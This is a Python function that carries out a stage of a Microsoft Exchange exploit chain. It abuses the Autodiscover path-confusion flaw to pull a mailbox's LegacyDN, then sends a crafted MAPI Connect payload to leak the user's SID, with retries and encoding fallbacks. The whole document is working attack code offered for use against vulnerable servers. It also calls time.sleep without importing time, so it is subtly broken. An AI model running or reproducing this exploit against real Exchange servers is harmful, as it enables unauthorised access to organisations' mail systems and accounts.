import re
import requests
import xml.etree.ElementTree as ET
from requests.exceptions import RequestException, ConnectionError, ReadTimeout

def get_sid(url: str, email: str, timeout: float = 8.0, retries: int = 3) -> str:
    """
    Robust version of get_sid:
    - parses LegacyDN via XML (with substring fallback)
    - tries sending the MAPI payload using utf-8 then utf-16le legacydn encodings
    - sends Content-Length and Connection headers
    - retries on transient errors and prints helpful diagnostics on failure
    """
    print("[-] Getting LegacyDN (Autodiscover)")
    body = (
        '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
        '<Request>'
        f'<EMailAddress>{email}</EMailAddress>'
        '<AcceptableResponseSchema>'
        'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
        '</AcceptableResponseSchema>'
        '</Request>'
        '</Autodiscover>'
    )

    autodiscover_url = url + "/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
    try:
        resp = requests.post(autodiscover_url, headers={"Content-Type": "text/xml"}, data=body.encode("utf-8"), verify=False, timeout=timeout)
    except RequestException as e:
        raise RuntimeError(f"[Stage 1] Autodiscover request error: {e}") from e

    if resp.status_code != 200:
        snippet = (resp.text or "")[:600].replace("\n", " ")
        raise RuntimeError(f"[Stage 1] Autodiscover returned {resp.status_code}. Body snippet: {snippet}")

    # try XML parse -> fallback to regex
    legacydn = None
    try:
        xml_root = ET.fromstring(resp.content)
        for el in xml_root.iter():
            if el.tag.endswith("LegacyDN"):
                if el.text and el.text.strip():
                    legacydn = el.text.strip()
                    break
    except Exception:
        pass

    if not legacydn:
        m = re.search(r"<LegacyDN>(.*?)</LegacyDN>", resp.content.decode("utf-8", errors="ignore"), re.DOTALL | re.IGNORECASE)
        if m:
            legacydn = m.group(1).strip()

    if not legacydn:
        raise RuntimeError("[Stage 1] Cannot obtain LegacyDN from Autodiscover response. Dumping small body snippet:\n" + (resp.text or "")[:800])

    print(f"[+] Successfully got LegacyDN: {legacydn!r}")

    # prepare suffix bytes (same as original)
    suffix = b'\x00\x00\x00\x00\x00\xe4\x04' + b'\x00\x00\x09\x04\x00\x00\x09' + b'\x04\x00\x00\x00\x00\x00\x00'

    # we'll try a couple of encodings for legacydn — utf-8 and utf-16le
    encodings_to_try = ["utf-8", "utf-16le"]

    headers_base = {
        "X-Requesttype": "Connect",
        "X-Clientapplication": "Outlook/15.1.2176.9",
        "X-Requestid": "anything",
        "Content-Type": "application/mapi-http",
        # We'll set Content-Length per attempt below and Connection header
    }

    sid_endpoint = url + "/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"

    last_exc = None
    for enc in encodings_to_try:
        print(f"[-] Trying MAPI payload with legacydn encoding: {enc}")
        try:
            legacydn_bytes = legacydn.encode(enc)
        except Exception as e:
            print(f"[!] Encoding {enc} failed: {e}")
            continue

        payload = legacydn_bytes + suffix
        headers = headers_base.copy()
        headers["Content-Length"] = str(len(payload))
        headers["Connection"] = "close"

        attempt = 0
        while attempt < retries:
            attempt += 1
            try:
                r = requests.post(sid_endpoint, data=payload, headers=headers, verify=False, timeout=timeout)
                # If the server closed connection without answering, requests may raise; otherwise inspect r
                text = r.text or ""
                # try extracting SID
                m = re.search(r"with SID\s+([A-Za-z0-9\-\_]+)\s+and MasterAccountSid", text, re.IGNORECASE)
                if m:
                    sid = m.group(1)
                    print(f"[+] Successfully get User SID: {sid}")
                    return sid
                else:
                    # if no SID found, print useful diagnostics and break to try next encoding
                    short = text[:800].replace("\n", " ")
                    print(f"[!] No SID in response (status {r.status_code}). Body snippet:\n{short}")
                    break
            except (ConnectionError, ReadTimeout) as e:
                print(f"[!] Connection error on attempt {attempt}/{retries} with encoding {enc}: {e}")
                last_exc = e
                # small backoff
                time.sleep(1 + attempt)
            except RequestException as e:
                print(f"[!] RequestException: {e}")
                last_exc = e
                break

    # if we fall out, nothing succeeded
    raise RuntimeError(f"[Stage 2] Failed to obtain SID. Last error: {last_exc}\nHint: examine server logs / IIS logs and verify this Exchange instance is vulnerable and your path-confusion token is correct.")

